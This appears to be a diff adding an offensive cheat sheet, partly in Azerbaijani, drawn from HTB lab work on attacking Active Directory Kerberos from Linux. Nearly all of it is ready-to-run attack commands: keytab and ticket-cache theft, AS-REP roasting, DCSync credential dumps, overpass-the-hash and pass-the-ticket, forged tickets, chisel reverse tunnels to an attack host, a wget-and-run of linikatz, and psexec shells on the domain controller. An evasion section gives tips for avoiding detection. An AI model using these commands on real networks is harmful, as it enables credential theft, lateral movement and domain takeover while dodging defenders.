@@ -1,1 +1,251 @@
+====== Lazım olan Toollar ===========================================================================================================================================
+
+# Impacket Suite (Əsas toollar)
+sudo apt install impacket-scripts
+
+# Kerbrute (Enumeration üçün)
+go install github.com/ropnop/kerbrute@latest
+
+# CrackMapExec (Test üçün)
+pip install crackmapexec
+
+====== Environment Scouting & Enumeration =================================================================================================================================================================
+
+# Connect to User
+ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+
+# Domain info cekmek
+python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip 10.10.10.10 DOMAIN.LOCAL
+OR
+realm list ( Domain İnformation )
+OR
+ps -ef | grep -i "winbind\|sssd"
+
+# Keytab Files
+find / -name *keytab* -ls 2>/dev/null
+OR
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+# CCACHE Files
+env | grep -i krb5
+ls -la /tmp
+
+klist -k -t /opt/specialfiles/carlos.keytab ( Dump Credential Material ):
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 01/20/2026 17:25:01 carlos@INLANEFREIGHT.HTB
+   1 01/20/2026 17:25:01 carlos@INLANEFREIGHT.HTB
+   1 01/20/2026 17:25:01 carlos@INLANEFREIGHT.HTB
+
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab ( Credential Material write to CCACHE )
+klist:
+Ticket cache: FILE:/tmp/krb5cc_647401107_FzYTA8
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+01/20/2026 17:27:20  01/21/2026 03:27:20  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 01/21/2026 17:27:19
+01/20/2026 17:34:13  01/21/2026 03:27:20  cifs/dc01@INLANEFREIGHT.HTB ( SMB )
+01/20/2026 17:34:41  01/21/2026 03:27:20  HTTP/dc01@INLANEFREIGHT.HTB ( WINRM )
+        renew until 01/21/2026 17:27:19
+
+echo $KRB5CCNAME ( Check CCACHE )
+export KRB5CCNAME=/tmp/krb5cc_647401107_FzYTA8 ( Əgər yoxdursa daxil etmək )
+
+kinit -kt /opt/specialfiles/carlos.keytab carlos@INLANEFREIGHT.HTB ( Keytab ilə TGT almaq )
+
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+smbclient -L //dc01/ -k -no-pass
+smbclient //dc01/carlos$ -k -no-pass
+
+impacket-wmiexec inlanefreight.htb/carlos@dc01 -k -no-pass
+evil-winrm -i dc01 -r INLANEFREIGHT.HTB
+
+# Kerberos AS-REP Roasting (Weak passwords)
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN.LOCAL/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10
+
+# Kerbrute ile service enumeration
+kerbrute userenum -d DOMAIN.LOCAL --dc 10.10.10.10 usernames.txt
+
+====== DCSync Attack (Ən effektiv) ================================================================================================================================================================
+
+# Domain Admin və ya DCSync rights lazımdır
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.10.10 DOMAIN.LOCAL/administrator:'Password123' -just-dc
+
+# Veya hasha ilə
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN.LOCAL/administrator@10.10.10.10
+
+====== Overpass-the-Hash (PTH) ================================================================================================================================================================
+
+# NTLM hashdan TGT ticket yaratmaq
+python3 /usr/share/doc/python3-impacket/examples/GetTGT.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN.LOCAL/administrator
+
+# Ticket otomatik save olunur: /tmp/krb5cc_500
+export KRB5CCNAME=/tmp/krb5cc_500
+
+====== Proxychains PassTheTicket =====================================================================================================================================
+
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse 
+
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+
+İMPACKET:
+proxychains impacket-wmiexec dc01 -k
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Evil-WINRM
+sudo apt-get install krb5-user -y
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+Chisel Tunnel Qurmaq (Pivot)
+# Attack host-da (port 8080 açıq olmalıdır)
+./chisel server -p 8080 --reverse
+
+# Compromised internal host-da (DC-yə access var)
+./chisel client 10.10.10.100:8080 R:1080:127.0.0.1:80
+# Bu, local 1080 → DC traffic yönləndirir
+
+
+Proxychains Config
+# /etc/proxychains.conf
+socks5 127.0.0.1 1080
+
+
+/etc/hosts Redaktə etmək (Hardcoded IPs)
+# Domeni IP-yə map et
+echo "10.10.10.10 dc01.domain.local" >> /etc/hosts
+echo "10.10.10.10 domain.local" >> /etc/hosts
+echo "10.10.10.11 srv01.domain.local" >> /etc/hosts
+
+
+Kerberos Config (/etc/krb5.conf)
+cat > /etc/krb5.conf << EOF
+[libdefaults]
+    default_realm = DOMAIN.LOCAL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    rdns = false
+
+[realms]
+    DOMAIN.LOCAL = {
+        kdc = dc01.domain.local
+        admin_server = dc01.domain.local
+    }
+EOF
+
+
+Tunnel + Proxychains Test
+# Chisel tunnel aktivdir? Test
+proxychains nmap -p 88,445 10.10.10.10
+
+# DNS bypass test
+proxychains nslookup dc01.domain.local 127.0.0.1
+# /etc/hosts-dan cavab gəlməlidir
+
+
+Credentials/Hashes Əldə etmək
+# Proxied DCSync
+proxychains python3 GetTGT.py -hashes :NTLMHASH domain.local/administrator
+
+# Və ya ASREPRoast
+proxychains python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
+
+
+TGT Ticket Yaratmaq
+# PTH → TGT (Proxied)
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetTGT.py \
+  -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
+  domain.local/administrator
+
+# Ticket /tmp/krb5cc_500 yaradılacaq
+export KRB5CCNAME=/tmp/krb5cc_admin
+klist  # Verify
+
+
+Proxied PtT Attacks
+# SMB Access
+proxychains impacket-smbclient //dc01.domain.local/C$ -k -no-pass
+
+# PSEXEC
+proxychains impacket-psexec domain.local/administrator@dc01.domain.local/ -k -no-pass
+
+# WMIEXEC (Stealth)
+proxychains impacket-wmiexec domain.local/administrator@10.10.10.11 -k -no-pass "whoami /all"
+
+# RPCDUMP (Hash dump)
+proxychains impacket-rpcdump domain.local/administrator@dc01.domain.local -k -no-pass
+
+====== Linikatz ======================================================================================================================================
+
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+./linikatz.sh
+
+====== AS-REP Roasting sonrası ================================================================================================================================================================
+
+# Crack edilmis passwordla TGT
+python3 /usr/share/doc/python3-impacket/examples/GetTGT.py DOMAIN.LOCAL/user -dc-ip 10.10.10.10
+
+====== Ticket İdarəetmə ================================================================================================================================================================
+
+# Mövcud ticketləri görmək
+export KRB5CCNAME=FILE:/tmp/tickets
+klist
+
+# Ticket export etmək (.kirbi format)
+python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-xxx -domain DOMAIN.LOCAL administrator -user-id 500
+
+# Ticketləri köçürmək
+scp /tmp/admin.ccache user@linux-server:/tmp/
+
+====== SMB Access ================================================================================================================================================================
+
+# SMB sharelərə çıxmaq
+export KRB5CCNAME=/tmp/krb5cc_admin
+impacket-smbclient //10.10.10.10/C$ -k -no-pass
+
+# PSEXEC ilə shell
+impacket-psexec DOMAIN.LOCAL/administrator@10.10.10.10 -k -no-pass
+
+====== WinRM Access ================================================================================================================================================================
+
+impacket-wmiexec DOMAIN.LOCAL/administrator@10.10.10.10 -k -no-pass
+impacket-rpcdump DOMAIN.LOCAL/administrator@10.10.10.10 -k -no-pass
+
+====== Service Access ================================================================================================================================================================
+
+# MSSQL
+impacket-mssqlclient DOMAIN.LOCAL/administrator@10.10.10.10 -k -no-pass
+
+# RDP (xfreerdp ilə)
+xfreerdp /u:DOMAIN.LOCAL\\administrator /v:10.10.10.10 /cert:ignore
+
+====== Detection & Evasion ================================================================================================================================================================
+
+- Event ID 4769 (Kerberos Service Ticket Operations)
+- Event ID 4624 (Logon Type 9 - NewCredential)
+- Unusual service logons from Linux hosts
+
+# Ticket lifetime qısaltmaq (30 dəqiqə)
+python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN.LOCAL user -user-id 500 -duration 30m
+
+# OPSEC-friendly timing
+sleep $((RANDOM % 300)); impacket-psexec ...
+
+# Kerberos config düzgün olmalıdır
+cat /etc/krb5.conf
+[libdefaults]
+    default_realm = DOMAIN.LOCAL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+kinit -k -t /tmp/admin.keytab administrator@DOMAIN.LOCAL
 
